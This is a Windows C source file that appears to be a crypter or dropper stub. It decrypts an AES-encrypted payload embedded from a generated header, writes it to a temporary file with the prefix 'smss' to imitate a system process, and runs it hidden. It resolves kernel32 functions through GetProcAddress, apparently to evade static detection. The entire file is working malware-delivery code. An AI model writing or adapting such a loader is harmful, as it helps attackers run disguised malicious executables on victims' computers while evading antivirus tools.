#include <tchar.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wchar.h>
#include "tmp/Stub.h" 
#include "include/aes/aes.h"

unsigned char key[AES_KEYLEN];
unsigned char iv[AES_BLOCKLEN];

void initializeEncryptionParameters() {
    memset(key, 0, AES_KEYLEN);
    memset(iv, 0, AES_BLOCKLEN);

    size_t keyLength = strlen(keyString); // Assumes keyString is null-terminated
    size_t ivLength = strlen(ivString); // Assumes ivString is null-terminated

    memcpy(key, keyString, keyLength);
    memcpy(iv, ivString, ivLength);
}


typedef BOOL (WINAPI *pCreateProcessW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI *pGetTempPathW)(
  DWORD nBufferLength,
  LPWSTR lpBuffer
);

typedef UINT (WINAPI *pGetTempFileNameW)(
  LPCWSTR lpPathName,
  LPCWSTR lpPrefixString,
  UINT    uUnique,
  LPWSTR  lpTempFileName
);

typedef HANDLE (WINAPI *pCreateFileW)(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

typedef BOOL (WINAPI *pWriteFile)(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef DWORD (WINAPI *pResumeThread)(
  HANDLE hThread
);

typedef DWORD (WINAPI *pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

typedef BOOL (WINAPI *pCloseHandle)(
  HANDLE hObject
);


int decryptData(unsigned char *ciphertext, int ciphertext_len, unsigned char *plaintext, const unsigned char* key, const unsigned char* iv) {
    if (ciphertext_len % AES_BLOCKLEN != 0) {
        // Ciphertext length is not a multiple of AES block size
        return -1;
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    // Copy ciphertext to plaintext buffer for in-place decryption
    memcpy(plaintext, ciphertext, ciphertext_len);
    AES_CBC_decrypt_buffer(&ctx, plaintext, ciphertext_len);

    // int plaintext_len = remove_pkcs7_padding(plaintext, ciphertext_len); // can use if adding padding on encrypt, but we are not
    int plaintext_len = ciphertext_len;
    if (plaintext_len < 0) {
        // Error in padding
        return -1;
    }

    return plaintext_len;
}

int main() {

    initializeEncryptionParameters();

    const char* _moduleHandle = "kernel32.dll";
    HMODULE _hModule = GetModuleHandleA(_moduleHandle); // ANSI version
    pGetTempPathW myGetTempPathW = (pGetTempPathW)GetProcAddress(_hModule, "GetTempPathW");
    pGetTempFileNameW myGetTempFileNameW = (pGetTempFileNameW)GetProcAddress(_hModule, "GetTempFileNameW");
    pCreateFileW myCreateFileW = (pCreateFileW)GetProcAddress(_hModule, "CreateFileW");
    pWriteFile myWriteFile = (pWriteFile)GetProcAddress(_hModule, "WriteFile");
    pResumeThread myResumeThread = (pResumeThread)GetProcAddress(_hModule, "ResumeThread");
    pWaitForSingleObject myWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(_hModule, "WaitForSingleObject");
    pCloseHandle myCloseHandle = (pCloseHandle)GetProcAddress(_hModule, "CloseHandle");

    unsigned char* decryptedData = (unsigned char*)malloc(encryptedDataSize);
    if (decryptedData == NULL) {
        perror("Failed to allocate memory for decryptedData");
        return 1; // Exit with error code 1
    }

    int decryptedDataSize = decryptData(encryptedData, encryptedDataSize, decryptedData, key, iv);

    WCHAR temporaryDir[MAX_PATH];
    DWORD pathLen = 0;
    if (myGetTempPathW) { // Always check if the function was loaded successfully
        pathLen = myGetTempPathW(MAX_PATH, temporaryDir);
        if (pathLen > 0) {

            WCHAR temporaryFile[MAX_PATH];
            if (myGetTempFileNameW) { // Always check if the function was loaded successfully
                UINT result = myGetTempFileNameW(temporaryDir, L"smss", 0, temporaryFile);
                if (result != 0) {
                    HANDLE hFile = myCreateFileW(temporaryFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
                    if (hFile == INVALID_HANDLE_VALUE) {
                        return -1;
                    }

                    DWORD written;
                    BOOL result = myWriteFile(hFile, decryptedData, decryptedDataSize, &written, NULL);
                    if (!result) {
                        // Handle error
                        if (myCloseHandle) { // Always check if the function was loaded successfully
                            if (!myCloseHandle(hFile)) {
                                return -1;
                            }
                        } else {
                            return -1;
                        }
                        return -1;
                    }

                    if (written != decryptedDataSize) {
                        if (myCloseHandle) {
                            if (!myCloseHandle(hFile)) {
                                return -1;
                            }
                        } else {
                            return -1;
                        }
                        return -1;
                    }

                    if (myCloseHandle) {
                        if (!myCloseHandle(hFile)) {
                            return -1;
                        }
                    } else {
                        return -1;
                    }

                    STARTUPINFOW si = { sizeof(si) };
                    PROCESS_INFORMATION pi = { 0 };
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;

                    pCreateProcessW myCreateProcessW;
                    const char* _moduleFunc = "CreateProcessW";
                    FARPROC procAddress = GetProcAddress(_hModule, _moduleFunc);
                    myCreateProcessW = (pCreateProcessW)procAddress;

                    

                    if (!myCreateProcessW) {
                        return -1;
                    }

                    if (!myCreateProcessW(temporaryFile, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
                        return -1;
                    }

                    if (myResumeThread) {
                        DWORD result = myResumeThread(pi.hThread);
                        if (result == (DWORD)-1) {
                            return -1;
                        } else {
                            if (myWaitForSingleObject) {
                                DWORD waitResult = myWaitForSingleObject(pi.hProcess, INFINITE);
                                switch (waitResult) {
                                    case WAIT_OBJECT_0:
                                        break;
                                    case WAIT_TIMEOUT:
                                        break;
                                    case WAIT_FAILED:
                                        break;
                                    default:
                                        break;
                                }
                            } else {
                                return -1;
                            }
                            
                            if (myCloseHandle) { 
                                if (!myCloseHandle(pi.hProcess)) {
                                    return -1;
                                }
                                if (!myCloseHandle(pi.hThread)) {
                                    return -1;
                                }
                            } else {
                                return -1;
                            }
                  
                        }
                    } else {
                        return -1;
                    }
                    

                }
            }

            
        }
    }
    return 0;
}